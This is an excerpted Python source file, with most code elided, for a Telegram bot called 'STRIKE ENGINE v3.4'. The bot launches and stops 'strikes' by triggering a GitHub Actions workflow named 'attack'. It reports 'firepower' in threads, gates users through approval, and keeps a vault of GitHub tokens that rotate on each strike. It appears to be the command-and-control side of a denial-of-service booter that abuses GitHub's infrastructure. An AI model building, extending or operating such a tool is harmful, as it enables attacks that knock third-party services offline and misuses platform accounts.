...
WAITING_FOR_BINARY = 1  # Not used now, but kept for compatibility
...
# ============================================================
def get_workflow_logs_url(repo, run_id):
    try:
                    ...
                    if wf.name == "attack":
                        ...
                        if runs.totalCount > 0:
                            ...
                            if status == "completed" and conclusion == "success":
                                ...
                                logs_url = get_workflow_logs_url(repo, latest.id)
...
async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        if not active_attacks:
            await update.message.reply_text("📡 SYSTEM STANDBY\n\nStatus: 🟢 IDLE\nStrikes: 0\nOutput: 0 GHz", parse_mode='HTML')
            return
        ...
        for aid, data in active_attacks.items():
            ...
            idx += 1
        msg += f"TOTAL STRIKES : {len(active_attacks)}\nFIREPOWER     : {total_threads} GHz"
        keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data="refresh_status"), InlineKeyboardButton("🛑 Terminate All", callback_data="stop")]]
...
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        if not can_attack(user_id):
            ...
            return
        if not active_attacks:
            await update.message.reply_text("✅ No active strikes.", parse_mode='HTML')
            return
        count = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        await update.message.reply_text(f"🛑 Terminated {count} strike(s).", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
    ...
    try:
        ...
        if can_attack(user_id):
            ...
            message = (
                ...
                f"<i>Tokens auto-rotate on each strike.</i>"
            )
...
# ============================================================
# ===== OTHER COMMANDS (help, myid, about) =====
# ============================================================
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        ...
        "<code>/tokens</code> | <code>/checktokens</code>\n"
        "<code>/approve</code> | <code>/remove</code>\n"
        "<code>/users</code> | <code>/pending</code>\n"
        "<code>/binary_upload</code> (not needed now)\n\n"
        "<b>ℹ️ UTILITY</b>\n"
...
async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"<b>🆔 YOUR DIGITAL FINGERPRINT</b>\n\n<code>{update.effective_user.id}</code>", parse_mode='HTML')

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>⚡ STRIKE ENGINE v3.4</b>\n\n"
...
async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        is_valid, info = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"❌ Invalid Token: {info}", parse_mode='HTML')
            return
        ...
        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(f"⚠️ User @{username} already has a token. Use /removetoken first.", parse_mode='HTML')
                return
        ...
        save_json('github_tokens.json', github_tokens)
        await update.message.reply_text(f"✅ Token added for @{username}. Vault size: {len(github_tokens)}", parse_mode='HTML')
    except Exception as e:
    ...
    try:
        ...
        for i, t in enumerate(github_tokens):
            if t.get('token') == token:
                github_tokens.pop(i)
                save_json('github_tokens.json', github_tokens)
                await update.message.reply_text("✅ Token removed.", parse_mode='HTML')
                return
...
async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        if not github_tokens:
            msg = "📭 Token Vault Empty" + (f" (removed {removed} expired)" if removed else "")
...
async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await tokens_cmd(update, context)  # same as tokens, but we can differentiate
...
# ============================================================
# ===== BINARY UPLOAD (legacy, but keep) =====
# ============================================================
async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ Binary upload is deprecated. Use /attack directly.", parse_mode='HTML')
...
def main():
    try:
        ...
        # Conversation handler for binary_upload (deprecated but kept)
        ...
        logger.info("⚡ STRIKE ENGINE v3.4 is ONLINE")
        logger.info(f"🔄 Token Rotation Active: {len(github_tokens)} tokens")
